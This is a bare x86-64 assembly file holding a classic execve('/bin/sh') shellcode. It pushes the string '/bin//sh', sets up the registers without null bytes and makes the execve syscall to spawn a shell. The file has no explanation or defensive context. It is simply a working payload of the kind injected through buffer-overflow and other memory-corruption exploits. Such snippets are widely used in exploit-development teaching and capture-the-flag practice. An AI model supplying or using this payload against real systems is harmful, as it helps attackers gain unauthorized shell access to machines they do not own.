bits 64

global _start

_start:
  xor rsi, rsi
  xor rdx, rdx
  push rdx
  mov rax, 0x68732f2f6e69622f
  push rax
  xor rax, rax
  mov rdi, rsp
  mov al, 0x3b
  syscall
